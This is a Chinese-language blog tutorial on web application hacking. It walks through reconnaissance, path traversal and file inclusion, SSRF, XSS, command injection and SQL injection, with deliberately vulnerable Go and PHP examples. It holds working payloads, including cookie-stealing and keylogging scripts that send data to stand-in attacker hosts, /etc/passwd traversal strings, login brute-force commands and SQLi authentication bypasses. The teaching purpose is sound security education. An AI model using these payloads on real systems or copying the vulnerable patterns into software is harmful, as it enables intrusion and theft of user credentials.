---
layout: post
title:  "Web Hacking 基础"
tags: [security]
---

* 目录
{:toc}

# Web Hacking

## 1. 应用走查

找到web应用可能存在漏洞的功能，并确认这些功能是否真的有漏洞。可能存在漏洞的功能通常是网站中需要与用户进行某种交互的部分。

### 1.1 浏览

直接用浏览器浏览网站，并记录如下表单：

|功能|URL|摘要|
|:-|:-|:-|
|主页|/|公司的业务概述|

### 1.2 阅读网页源码

网页源码由HTML、CSS、JS组成。是Web服务器返回的可读代码。阅读网页源码可以帮助我们发现有关该web应用的更多信息，比如使用了什么框架及其版本，如果是非最新版本，可能存在一些已知的漏洞。

通过网址前加上view-source，例如`view-source:https://www.baidu.com/`即可阅读网页源码。

### 1.3 开发者工具

以Chrome为例：

1. Element，可以查看和编辑html
2. Source，可以查看和调试js
3. Network，可以捕获网络请求

## 2. 内容发现

内容是指非公开的信息，比如供员工使用的页面、网站的旧版本、备份文件、配置文件、管理面板等。内容可以通过手动、自动、开源情报（OSINT: Open-Source Intelligence）获取。

### 2.1 手动发现

1. `/robots.txt`是一份告知搜索引擎哪些页面允许或不允许在其搜索结果中显示，或者完全禁止特定搜索引擎抓取网站的文档。
2. `favicon`是浏览器标签上的小图标，构建网站的框架可能会有默认的图标，如果开发者没有替换它，这就能为我们提供所用框架的线索。[OWASP](https://wiki.owasp.org/index.php/OWASP_favicon_database)托管了一个常见框架图标的数据库，可以用来与目标网站的图标的md5值进行比对。
3. `/sitemap.xml`提供了网站所有者希望在搜索引擎上列出的所有文件的列表。
4. `http headers`服务器返回的响应头，可能会返回网络服务器软件、可能正在使用的语言等信息。
5. `framework`如果从图标或源码中获取到网站使用的框架，从框架官网可以获取到更多信息。

### 2.2 开源情报

1. `google`可以使用过滤器精确搜索：
    - `site:xxx.com`仅返回来自xxx.com的结果
    - `inurl:xxx`返回在URL中包含xxx的结果
    - `filetype:pdf`返回具有.pdf扩展名的结果
    - `intitle:xxx`返回标题中包含xxx的结果
2. [`wappalyzer`](https://www.wappalyzer.com/)是一款在线工具和浏览器扩展程序，它有助于识别网站所使用的技术，例如框架、内容管理系统（CMS）、支付处理器等等，甚至还能找到版本号。
3. [`web archive`](https://archive.org/web/)是一个可追溯至90年代末的网站历史档案库。
4. `github`查找公司名称或网站名称，以尝试找到属于目标的仓库。
5. `http(s)://{name}.s3.amazonaws.com`对象存储桶如果权限设置不当，就可能公开秘密文件，存储桶可以通过多种方式发现，比如在网站的页面源代码、GitHub仓库中找到其URL，甚至可以通过自动化流程来发现。一种常见的自动化方法是使用公司名称，再加上一些常用术语，例如`{name}-assets`, `{name}-www`, `{name}-public`, `{name}-private`等。

### 2.3 自动发现

`wordlist`分不同使用场景，枚举目录、文件名，可以用[danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)词表，使用方式：

|工具|使用示例|
|:-|:-|
|ffuf|`ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://127.0.0.1/FUZZ`|
|dirb|`dirb http://127.0.0.1/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`|
|gobuster|`gobuster dir --url http://127.0.0.1/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`|

## 3. 子域名枚举

查找有效子域名是为了扩大攻击面，试图发现更多潜在的漏洞点。

### 3.1 开源情报

1. CA颁发证书是有记录的，称为CT（Certificate Transparency 证书透明度）日志，通过[`crt.sh`](https://crt.sh/)就可以查询到这些记录，来发现某个域名的子域名。
2. 使用Google搜索`site:*.domain.com -site:www.domain.com`，只会返回属于domain.com的子域名。

### 3.2 暴力破解

1. `dnsrecon -t brt -d domain.com`
2. `./sublist3r.py -d domain.com`会综合开源情报和暴力破解。

### 3.3 虚拟主机

如果子域名没有配置公开DNS可以通过web服务器来枚举：

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.domain.com" -u http://MACHINE_IP
```

很多Web服务器对不存在的页面也会返回200+404页面，可以通过查看运行结果中不存在的域名的size是多少，比如2048，那可以在命令里追加`-fs 2048`来过滤size=2048的结果。

## 4. 绕过身份认证

### 4.1 用户名枚举

可以通过网站的错误信息来枚举存在的用户名，`-mr`作用是仅当响应内容包含指定文本才输出。

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://127.0.0.1/signup -mr "username already exists"
```
### 4.2 暴力破解

将枚举到的用户名保存到`valid_usernames.txt`文件中，`-fc 200`表示过滤掉返回200的请求，这个参数需要结合具体场景来看，比如这里就适用密码错误返回200，密码正确返回302的场景。

```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://12.0.0.1/login -fc 200
```

### 4.3 逻辑缺陷

审查以下代码存在的逻辑缺陷：

```go
package main

import (
	"fmt"
	"net/http"
)

type User struct {
	Username string
	Password string
}

func handler(w http.ResponseWriter, r *http.Request) {
	// 模拟数据库
	users := map[string]User{
		"dew@email.com": {
			Username: "dew",
			Password: "666666",
		},
	}

	getEmail := r.URL.Query().Get("email")

	user, ok := users[getEmail]
	if !ok {
		fmt.Fprintln(w, "email not found")
		return
	}

	r.ParseForm()
	username := r.PostForm.Get("username")

	if username != user.Username {
		fmt.Fprintln(w, "username not match")
		return
	}

	sendToEmail := r.Form.Get("email")

	// 模拟发送邮件
	fmt.Fprintf(w, "Password reset email sent to: %s\n", sendToEmail)
}

func main() {
	http.HandleFunc("/", handler)
	http.ListenAndServe(":8088", nil)
}
```

我们可以使用如下命令，重置dew的密码：

```
curl 'http://127.0.0.1:8088/reset?email=dew@email.com' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=dew&email=attacker@email.com'
```

原因是`r.Form.Get`优先选择POST参数而非GET参数，因此`r.Form.Get("email")`得到的是attacker的邮箱。

### 4.4 Cookie 修改

如果身份信息存在Cookie中就有可能通过修改Cookie绕过身份验证，Cookie的种类可能是：

1. 明文：如果有logged_in等信息就可以尝试修改
2. 哈希：可以尝试通过彩虹表获取明文
3. 编码：通过编码后的特征识别出编码算法来还原明文

## 5. IDOR

IDOR：Insecure Direct Object Reference 不安全对象的直接引用。当服务器使用用户输入来检索对象时，如果对输入数据过于信任，且未在服务器端校验对象属于该用户，就可能出现IDOR漏洞。

一个最简单的例子是，你访问`http://127.0.0.1/user/dew`时可以看到自己的信息，接着你尝试访问`http://127.0.0.1/user/admin`居然可以获取到管理员的信息。

## 6. 文件包含

当网站提供从服务器获取文件的功能，且服务器没有做充分的输入验证，就可能存在文件包含漏洞。

攻击者可以利用这个漏洞获取服务器上的秘密文件。如果攻击者还发现其他方式可以向服务器上传文件，那文件包含漏洞可以被一起利用来实现远程命令执行。

### 6.1 路径遍历

路径遍历攻击，也称为`../`攻击。

假设此程序运行在`/tmp`，攻击者可以通过`curl 'http://127.0.0.1:8088?file=../etc/passwd'`获取到服务器的`/etc/passwd`文件内容。

```go
package main

import (
	"fmt"
	"net/http"
	"os"
)

func vulnerableHandler(w http.ResponseWriter, r *http.Request) {
	file := "./" + r.URL.Query().Get("file")

	content, err := os.ReadFile(file)
	if err != nil {
		http.Error(w, err.Error(), http.StatusNotFound)
		return
	}

	w.Write(content)
}

func main() {
	http.HandleFunc("/", vulnerableHandler)
	http.ListenAndServe(":8088", nil)
}
```

一些常见的系统文件：

|位置|描述|
|:-|:-|
|`/etc/issue`|包含要在登录提示前打印的消息或系统标识|
|`/etc/profile`|控制全系统的默认变量，例如导出变量、文件创建掩码（umask）、终端类型、用于指示新邮件何时到达的邮件消息|
|`/proc/version`|指定Linux内核的版本|
|`/etc/passwd`|包含所有有权访问系统的已注册用户|
|`/etc/shadow`|包含有关系统用户密码的信息|
|`/root/.bash_history`|包含root用户的历史命令|
|`/var/log/dmessage`|包含全局系统消息，包括系统启动期间记录的消息|
|`/var/mail/root`|root用户的所有电子邮件|
|`/root/.ssh/id_rsa`|服务器上root用户或任何已知有效用户的私有SSH密钥|
|`/var/log/apache2/access.log`|对Apache Web服务器的访问请求|
|`C:\boot.ini`|包含具有BIOS固件的计算机的启动选项|

### 6.2 本地文件包含

本地文件包含（Local File Inclusion LFI）通常是由开发人员缺乏安全意识导致的。

在php中，使用`include`、`require`、`include_once`和`require_once`等函数往往会导致漏洞的产生。

如下代码中正常用法是`/index.php?lang=en.php`，来获取英文站界面，但攻击者可以通过`/index.php?lang=/etc/passwd`来浏览任文件或执行任意php脚本。

```php
<?PHP 
	include($_GET["lang"]);
?>
```

如果开发者在函数内部指定目录，或强制用户输入包含某个路径前缀，则需要协同`../`攻击使用。

对于这种情况，除了用特定系统文件来尝试目录层级，还可以尝试通过报错信息来确定所在目录。

```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

#### 6.2.1 %00

假设你发现了一个LFI漏洞，也通过以上方法确定了目录层级，你尝试访问`/index.php?lang=../../../../etc/passwd`，结果看到了如下报错：

```
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 12
```

服务器程序在尝试读取`/etc/passwd.php`，这表示开发人员指定了要传递给include函数的文件类型。

在C语言中，`printf(""Hello\0World);`只会输出`Hello`，我们可以利用这个原理，通过`/index.php?lang=../../../../etc/passwd%00`截断掉`.php`文件类型。

> %00技巧在PHP 5.3.4及以上版本中不再有效。

#### 6.2.2 ./

当你尝试访问`/index.php?lang=/etc/passwd`报错：`You are not allowed to see source files! `，而其他任意不存在的文件则提示找不到时，说明服务器程序对特定文件进行了过滤。

第一个技巧也是利用%00，因为`"/etc/passwd" != "/etc/passwd\0"`。

第二个技巧是使用等效路径例如：
1. `/index.php?lang=/etc/./passwd`
2. `/index.php?lang=/etc////passwd`
3. `/index.php?lang=/etc/passwd/.`这个虽然表示一个目录，但在某些php版本中也可以成功。

#### 6.2.3 ....//

假设访问`/index.phg?lang=../../../../etc/passwd`报错如下：

```
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```

服务器程序实际在访问`languages/etc/passwd`，这说服务器程序对我们的输入做了处理，比如替换`../`为空字符串。

通过访问`/index.php?lang=....//....//....//....//etc/passwd`即可绕过这种防御。

### 6.3 远程文件包含

远程文件包含（Remote File Inclusion RFI）是指对用户输入检查处理不当，使得攻击者能够将外部URL注入到`include`函数中，前提是php服务器开启`allow_url_fopen`选项。

RFI的风险比LFI更高，因为RFI允许攻击者在服务器上获取RCE（远程命令执行）权限，进而导致以下后果：

1. 敏感信息泄露
2. 跨站脚本攻击（XSS）
3. 拒绝服务（DoS）

能拿到RCE权限的前提是，应用服务器能和攻击者放置php文件的服务器通信。

## 7. SSRF

服务器端请求伪造（Server-Side Request Forgery SSRF）漏洞，允许让服务器向攻击者选择的资源发出额外的或经过编辑的HTTP请求。

SSRF漏洞有两种类型：第一种是常规SSRF，数据会返回到攻击者的屏幕上。第二种是盲SSRF漏洞，这种情况下会发生SSRF，但不会有信息返回到攻击者的屏幕上。

一次成功的SSRF攻击可能导致：

1. 访问未授权区域
2. 访问客户/组织数据
3. 能扩展到内部网络
4. 泄露身份验证凭据

### 7.1 SSRF示例

1. 简单url替换

```bash
# 正常客户端请求为：
http://domain.com/stock?url=http://api.domain.com/api/stock/item?id=123
# 攻击者构造请求获取用户数据：
http://domain.com/stock?url=http://api.domain.com/api/user
# 服务器实际请求：
http://api.domain.com/api/user

# 也可以让服务器请求攻击者的服务
# 服务器的请求中也许会携带一些秘密信息
http://domain.com/stock?url=http://hacker.com/
```

2. 结合`../`

```bash
# 正常客户端请求为：
http://domain.com/stock?url=/item?id=123
# 攻击者构造请求获取用户数据：
http://domain.com/stock?url=/../user
# 服务器实际请求：
http://api.domain.com/api/stock/../user
```

3. `&x=`截断

```bash
# 正常客户端请求为：
http://domain.com/stock?server=api&id=123
# 攻击者构造请求获取用户数据：
http://domain.com/stock?server=api.domain.com/api/user&x=&id=123
# 服务器实际请求：
http://api.domain.com/api/user?x=.domain.com/api/stock/item?id=123
```

### 7.2 发现SSRF

常见的查找位置：

1. 地址栏参数使用完整的url：

```
http://domain.com/form?server=http://api.domain.com/store
```
2. 表单中的隐藏字段：

```html
<form method="post" action="/form">
	<input type="hidden" name="server" value="http://api.domain.com/store">
</form>
```
3. 参数值为部分url，例如主机名：

```
http://domain.com/form?server=api
```
4. 参数值为url的路径：

```
http://domain.com/form?dst=/store
```

### 7.3 绕过防御

开发者可能会加强用户输入校验，通常分为黑名单白名单两种。

1. 黑名单

比如把`localhost`、`127.0.0.1`放在黑名单中，攻击者可以使用`0`、`0.0.0.0`、`127.1`、`127.*.*.*`、`2130706433`、`017700000001`，或具有解析为127.0.0.1的DNS记录的子域名，例如`127.0.0.1.nip.io`。

此外在云环境中，`169.254.169.254`包含已部署云服务器的元数据，其中可能包括敏感信息。攻击者可以通过在自己的域名上注册一个子域，并设置指向IP地址169.254.169.254的DNS记录来绕过这一限制。

2. 白名单

比如要求参数值必须以`http://domain.com.`开头，攻击者可以创建一个子域名例如`http://domain.com.hacker.com`。

3. 开放重定向

很多网站为了统计点击率或做站外跳转，提供一个开放重定向接口，比如掘金：`https://link.juejin.cn/?target=https://google.com`

如果开发者的校验写的非常死，比如：

```go
if url.hasPrefix("http://domain.com/") {
	doRequest(url)
}
```

假设目标服务器也提供了开放重定向接口：`http://domain.com/link?target=https://google.com`

那我们就可以利用他的开放重定向接口：`http://domain.com/stock?url=http://domain.com/link?target=http://hacker.com`

> 注意开放重定向并不是潜在的SSRF漏洞，服务器并不会去发起请求。

## 8. XSS

跨站脚本攻击（Cross-site Scripting XSS），属于一种注入攻击，恶意JavaScript代码会被注入到Web应用程序中，目的是让其他用户执行这些代码。

### 8.1 攻击载荷

XSS攻击载荷，也叫Payload，是我们希望在目标计算机上执行的JavaScript代码，分为Intention意图和Modification修改两部分，意图是希望JavaScript实际执行的操作，修改时需要对代码做的更改。

常见的意图示例：

1. 概念验证：证明能够在网站上实施XSS，通常是让浏览器弹出提示

```html
<script>alert('XSS');</script>
```

2. 会话劫持：用户会话的详细信息（例如登录令牌）通常存储在目标设备的Cookie中

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

3. 键盘记录：意味着你在网页上输入的任何内容都会被黑客捕获

```html
<script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>
```

4. 业务逻辑：涉及调用特定网络资源或JavaScript函数，假设网站上存在一个更改用户电子邮件的函数

```html
<script>user.changeEmail('attacker@hacker.thm');</script>
```

### 8.2 反射型XSS

反射型跨站脚本攻击（Reflected XSS）发生在HTTP请求中用户提供的数据未经任何验证就被包含到网页源代码中时。

```go
package main

import (
	"fmt"
	"net/http"
)

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		// 获取 URL 参数 'payload'
		payload := r.URL.Query().Get("payload")

		// 漏洞点：直接将未经过滤的用户输入写入 ResponseBody
		fmt.Fprintf(w, "<h1>搜索结果</h1>")
		fmt.Fprintf(w, "你搜索的内容是: %s", payload)
	})

	fmt.Println("服务器启动在: http://localhost:8088")
	http.ListenAndServe(":8088", nil)
}

```

访问`http://localhost:8088/?payload=<script>alert('XSS Test')</script>`就能看到JavaScript被执行。如果我把这个链接伪装在邮件里发出去，就能让脚本在目标浏览器里执行。

### 8.3 存储型XSS

XSS攻击载荷存储在Web应用程序中（例如数据库中），然后在其他用户访问该网站或网页时运行。

```go
package main

import (
	"fmt"
	"net/http"
)

// 模拟数据库，存储用户的留言
var messages []string

func main() {
	// 首页：展示留言列表和提交表单
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")

		fmt.Fprintf(w, "<h2>极简留言板</h2>")

		// 漏洞点 1：直接循环输出存储的内容，未经过滤
		fmt.Fprintf(w, "<ul>")
		for _, msg := range messages {
			fmt.Fprintf(w, "<li>%s</li>", msg)
		}
		fmt.Fprintf(w, "</ul>")

		// 提交留言的表单
		fmt.Fprintf(w, `
			<form action="/post" method="post">
				<input type="text" name="content" placeholder="输入留言">
				<button type="submit">提交</button>
			</form>
		`)
	})

	// 处理提交逻辑
	http.HandleFunc("/post", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost {
			// 漏洞点 2：直接接收并存储原始字符串
			content := r.FormValue("content")
			messages = append(messages, content)
		}
		// 重定向回首页
		http.Redirect(w, r, "/", http.StatusSeeOther)
	})

	fmt.Println("服务器启动: http://localhost:8088")
	http.ListenAndServe(":8088", nil)
}
```

攻击者先提交`<script>alert('XSS Test')</script>`，后续进入这个网页的人，都会受到XSS攻击。这种方式甚至不需要主动诱导点击，因为反射性XSS需要把脚本包装在请求中，而存储型不需要。

### 8.4 基于DOM的XSS

`windows.location.hash`是url里`#`的部分，表示网页上的某个位置。如果网页会将其写入DOM，就可以进行XSS攻击。

```go
package main

import (
	"fmt"
	"net/http"
)

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		// 设置响应头，允许浏览器解析 HTML
		w.Header().Set("Content-Type", "text/html; charset=utf-8")

		// 返回包含漏洞 JS 逻辑的 HTML
		// 注意：这里我们使用了 ` (反引号) 来编写多行字符串
		fmt.Fprint(w, `
<!DOCTYPE html>
<html>
<head><title>Go DOM XSS Demo</title></head>
<body>
    <h1>欢迎来到我的站点</h1>
    <div id="display"></div>

    <script>
        // 1. 从 URL Hash 中读取数据 (Source)
        var rawData = window.location.hash.substring(1);
        
        // 2. 解码数据
        var decodedData = decodeURIComponent(rawData);

        // 3. 漏洞点：直接写入 innerHTML (Sink)
		// 方式1
		document.getElementById('display').innerHTML = "参数内容: " + decodedData;
		// 方式2
		// eval(decodedData);
    </script>
</body>
</html>
		`)
	})

	fmt.Println("服务器已启动: http://localhost:8088")
	http.ListenAndServe(":8088", nil)
}
```

需要注意的是，直接`http://localhost:8088/#<script>alert('XSS Test')</script>`是不行的，因为页面解析完后动态注入的脚本是不允许运行的。

但是可以通过`http://localhost:8088/#<img src=1 onerror=alert('XSSTest')>`来进行攻击。注意这里我有意去掉了空格，尽量避免在脚本中包含空格，可能出现各种问题。

如果代码中有`eval()`这种函数，直接`http://localhost:8088/#alert(XSS Test)`即可。

### 8.5 盲注XSS

和存储型XSS类似，载荷存储在网站上，但是看不到载荷是否起作用，也无法先在自己身上测试。比如网站提供联系我们功能，用户可以提交消息，但是只有网站的后台网页能看到消息。

在测试盲注XSS漏洞时，需要确保载荷包含回调，这样才能知道脚本是否以及何时执行。一个常用工具是[XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)，该工具会自动捕获Cookie、URL、页面内容等信息。

也可以使用`nc -nlvp 9001`可以创建一个监听服务，对应的有效载荷为`<script>fetch('http://IP:9001?cookie=' + btoa(document.cookie) );</script>`，将目标浏览器的Cookie告诉攻击者的监听服务。

### 8.6 Polyglots

这是一个被称为 “XSS 多面手”（XSS Polyglot） 的终极 Payload。它的强大之处在于：无论你把它丢进 HTML 的哪个角落，它几乎都能触发。

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

## 9. 竞态条件

假如目标是购物网站，是否有可能重复使用10元代金券支付100元的商品？

竞态条件有三个常见原因：

1. 并行执行：Web服务器可能会并行执行多个请求，以处理并发的用户交互。如果这些请求在没有适当同步的情况下访问和修改共享资源或应用程序状态，可能会导致竞态条件和意外行为。
2. 数据库操作：并发数据库操作（例如读取-修改-写入序列）可能会引入竞争条件。例如，两个用户尝试同时更新同一条记录，可能会导致数据不一致或冲突。解决方法在于实施适当的锁定机制和事务隔离。
3. 第三方库和服务：Web应用程序通常会集成第三方库、API和其他服务。如果这些外部组件在设计上未能妥善处理并发访问，那么当多个请求或操作同时与其交互时，就可能会出现竞态条件。

想触发竞态需要借助工具，通过burp proxy拿到请求，再发送到repeater，创建group并复制tab 100次，接着可以将Send改为Send Group来并发请求。

## 10. 命令注入

命令注入是对应用程序行为的滥用，目的是在操作系统上执行命令，所使用的权限与设备上应用程序运行时的权限相同，命令注入通常也被称为远程代码执行（RCE）。

如下代码可以通过`?filename=app.log;whoami`来执行命令。

```go
package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
	// 从 URL 参数中获取文件名，例如：?filename=app.log
	filename := r.URL.Query().Get("filename")

	if filename != "" {
		// 【漏洞核心】：使用 /bin/sh -c 来执行拼接后的字符串
		// 这会启动一个 Shell 解释器，解析其中的特殊字符（如 ; | &）
		cmdStr := fmt.Sprintf("tail -n 10 %s", filename)
		cmd := exec.Command("sh", "-c", cmdStr)

		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Fprintf(w, "错误: %s\n输出: %s", err, string(output))
			return
		}
		fmt.Fprintf(w, "文件内容:\n%s", string(output))
	} else {
		fmt.Fprintf(w, "请提供 filename 参数")
	}
}

func main() {
	http.HandleFunc("/view", handler)
	fmt.Println("服务器启动在 :8088...")
	http.ListenAndServe(":8088", nil)
}
```

### 10.1 漏洞利用

命令注入通常可以通过以下两种方式之一被检测到：

1. 盲命令注入：在测试有效载荷时，应用程序不会有直接输出。你必须调查应用程序的行为，以确定你的有效载荷是否成功。
	- 使用有时间延迟的有效载荷，例如`ping`、`sleep`。
	- 强制输出，比如通过`>`实现。
2. 详细命令注入：在测试有效载荷时，应用程序会给出直接反馈。例如，运行whoami命令来查看应用程序运行时所使用的用户，Web应用程序会在页面上直接输出用户名。

有用的载荷：

1. linux

|载荷|描述|
|:-|:-|
|whoami|查看应用程序正在哪个用户下运行。|
|ls|列出当前目录的内容。你可能会找到诸如配置文件、环境文件（令牌和应用程序密钥）等诸多有价值的文件。|
|ping|此命令将导致应用程序挂起。这在测试应用程序是否存在盲命令注入问题时会很有用。|
|sleep|这是在测试应用程序是否存在盲命令注入时的另一个有用负载，适用于机器上未安装ping的情况。|
|nc|Netcat可用于在易受攻击的应用程序上生成反向shell。你可以利用这个立足点在目标机器上浏览其他服务、文件或可能的提权方法。|

2. windows

|载荷|描述|
|:-|:-|
|whoami|查看应用程序正在哪个用户下运行。|
|dir|列出当前目录的内容。你可能会找到诸如配置文件、环境文件（令牌和应用程序密钥）等诸多有价值的文件。|
|ping|此命令将导致应用程序挂起。这在测试应用程序是否存在盲命令注入问题时会很有用。|
|timeout|此命令还会导致应用程序挂起。如果未安装ping命令，它对于测试应用程序是否存在盲命令注入也很有用。|

相关链接：[Command Injection Payload List](https://github.com/payload-box/command-injection-payload-list)

## 11. SQL注入

SQL注入分三种类型：`In-Band`、`Blind`、`Out-of-Band`。

### 11.1 In-Band

假设原本后台使用的sql语句是`select * from article where id = 1`，`1`是用户的输入。

1. `select * from article where id = 1'`通过一些特殊字符，通常是`'`或`"`，看是否产生SQL错误，如果有就说明存在SQL注入漏洞。

2. `union select 1,2,3`确定sql返回列数量。
3. `0 union select 1,2,3`让第一个查询不产生结果。
4. `0 UNION SELECT 1,2,database()`使用`database()`查看数据库名。
5. `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'db_name'`查询有哪些表。
6. `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'`查询表有哪些列。
7. `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR ' ') FROM users`获取表数据。

### 11.2 Blind

盲注无法通过界面上的结果来判断是否成功，但我们可以通过其他反馈来枚举整个数据库。

#### 11.2.1 身份验证绕过

这种场景没必要枚举数据库信息，只需要让查询返回true即可。

假设原本后台使用的sql语句是`select * from users where username='%username%' and password='%password%' LIMIT 1;`，`username`和`password`是用户的输入。

我们可以把密码输入为`' OR 1=1;--`来绕过。

#### 11.2.2 基于布尔值

假设原本后台使用的sql语句是`select * from users where username = 'admin' LIMIT 1`，username作为输入，判断用户是否存在，如果结果是1行就接口就返回true，是0行接口就返回false，我们通过这个接口就可以枚举出所有数据。

1. `notexist' UNION SELECT 1,2,3;--`确定返回列数量，直到接口返回true。
2. `notexist' UNION SELECT 1,2,3 where database() like 'a%';--`确认数据库名，不断枚举字符，返回true说明以字母a开头。
3. 对于表名、列名等也是通过`%`来枚举。

#### 11.2.3 基于时间

这回连bool值都没有，但是可以通过响应时间来判断。比如`notexist' UNION SELECT SLEEP(5),2,3;--`如果响应时间小于5说明列数不是3列，否则就是3列。

### 11.3 Out-of-Band

OOB SQLi 的核心在于：让数据库服务器主动向攻击者控制的外部服务器发起请求。

攻击者会构造一个特殊的 SQL 语句，利用数据库内置的函数（通常是处理文件系统或网络请求的函数），将查询结果作为域名的一部分或路径，发送到攻击者的服务器日志中。

Out-of-Band SQL注入并不常见，它需要满足以下条件：

1. 出网权限：服务器必须能够访问外网（或者至少能与攻击者的服务器通信）。
2. 数据库需要开启特定的选项，比如MySQL需要secure_file_priv未禁用。或者业务逻辑会根据SQL查询的结果进行某种外部网络调用。

最常见的媒介是DNS或HTTP：
1. DNS泄露：将获取的数据拼接到一个域名中（例如password.attacker.com）。当数据库尝试解析这个域名时，攻击者的DNS服务器就会记录下这个查询。
2. HTTP泄露：让数据库访问一个特定的URL。